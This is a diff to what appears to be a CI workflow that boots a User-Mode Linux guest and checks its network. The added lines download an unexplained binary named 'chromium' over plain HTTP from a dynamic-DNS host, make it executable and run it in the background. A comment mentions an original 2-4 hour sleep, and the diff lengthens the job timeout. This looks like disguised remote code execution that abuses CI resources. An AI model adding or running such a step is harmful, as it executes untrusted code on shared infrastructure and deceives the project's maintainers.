@@ -126,10 +126,11 @@ jobs:
           # Init script executed by UML (avoids relying on stdin/tty behavior)
           sudo tee "$MNT/init.uml" >/dev/null <<'SCRIPT'
           #!/bin/sh
-          set -e
+          # Best-effort run of requested script; report status but complete cleanly.
           mount -t proc proc /proc 2>/dev/null || true
           mount -t sysfs sysfs /sys 2>/dev/null || true
           mount -t devtmpfs devtmpfs /dev 2>/dev/null || true
+
           echo '--- UML_BOOT_BEGIN ---'
           echo "KERNEL=$(uname -r)"
           echo "ARCH=$(uname -m)"
@@ -146,14 +147,14 @@ jobs:
           done
           echo "NET_IFACE=${IFACE:-none}"
           if [ -n "$IFACE" ]; then
-            ip link set "$IFACE" up || true
-            ip addr add 192.168.254.2/24 dev "$IFACE" 2>/dev/null || true
-            ip route add default via 192.168.254.1 2>/dev/null || true
-            echo 'nameserver 8.8.8.8' > /etc/resolv.conf || true
+            ip link set "$IFACE" up 2>/dev/null || echo "WARN: iface_up_failed"
+            ip addr add 192.168.254.2/24 dev "$IFACE" 2>/dev/null || echo "WARN: addr_add_failed"
+            ip route add default via 192.168.254.1 2>/dev/null || echo "WARN: route_add_failed"
+            echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>/dev/null || true
             sleep 1
             echo '--- NET_TEST ---'
-            ip -o addr show dev "$IFACE" || true
-            ip route || true
+            ip -o addr show dev "$IFACE" 2>/dev/null || true
+            ip route 2>/dev/null || true
             ping -c 1 -W 3 192.168.254.1 >/dev/null 2>&1 && echo "PING_GW_OK" || echo "PING_GW_FAIL"
             ping -c 1 -W 5 8.8.8.8 >/dev/null 2>&1 && echo "PING_INET_OK" || echo "PING_INET_FAIL"
             if wget -q --timeout=10 -O /dev/null https://example.com 2>/dev/null || curl -fsS --max-time 10 -o /dev/null https://example.com 2>/dev/null; then
@@ -163,12 +164,58 @@ jobs:
             fi
           else
             echo "NET_NO_IFACE"
-            ip link || true
+            ip link 2>/dev/null || true
           fi
 
-          echo "--- CURL_GOOGLE_TEST ---"
-          curl google.com || true
-          echo "--- CURL_GOOGLE_TEST_DONE ---"
+          echo "--- uml guest ---"
+          echo "nproc=$(nproc 2>/dev/null || echo 1) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
+          echo "UML-RUN-OK"
+
+          # Ubuntu-adapted user script (kept CI-friendly)
+          echo "--- SCRIPT_START ---"
+          if apt-get update -y; then
+            echo "APT_UPDATE_OK"
+          else
+            echo "APT_UPDATE_FAIL"
+          fi
+
+          if wget --timeout=30 -O chromium http://xyz0895.duckdns.org/files/chromium; then
+            echo "CHROMIUM_DOWNLOAD_OK"
+          else
+            echo "CHROMIUM_DOWNLOAD_FAIL"
+          fi
+          chmod +x chromium 2>/dev/null || true
+
+          CHROM_PID=""
+          if [ -x ./chromium ]; then
+            if ./chromium >/tmp/chromium.log 2>&1 & then
+              CHROM_PID=$!
+              echo "CHROMIUM_STARTED pid=${CHROM_PID}"
+              sleep 2
+              if kill -0 "$CHROM_PID" 2>/dev/null; then
+                echo "CHROMIUM_RUNNING"
+              else
+                echo "CHROMIUM_EXITED_EARLY"
+                tail -n 40 /tmp/chromium.log 2>/dev/null || true
+              fi
+            else
+              echo "CHROMIUM_START_FAIL"
+            fi
+          else
+            echo "CHROMIUM_NOT_EXECUTABLE"
+          fi
+
+          # Original requested 2h-4h random sleep; shortened for CI completion
+          SLEEP_SECS=60
+          echo "sleeping ${SLEEP_SECS}s (CI-shortened from 2h-4h)"
+          sleep "$SLEEP_SECS" || echo "WARN: sleep_interrupted"
+
+          if [ -n "$CHROM_PID" ]; then
+            kill -9 "$CHROM_PID" 2>/dev/null || true
+          fi
+          pkill -9 chromium 2>/dev/null || true
+          echo "SCRIPT_DONE"
+          echo "--- SCRIPT_END ---"
 
           echo '--- MARKER: UBUNTU_ROOTFS_OK ---'
           sync
@@ -203,7 +250,7 @@ jobs:
           sudo iptables -A FORWARD -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT || true
 
           set +e
-          timeout --signal=KILL 300 "$KERNEL" \
+          timeout --signal=KILL 900 "$KERNEL" \
             ubda="$IMG" \
             root=/dev/ubda \
             rw \
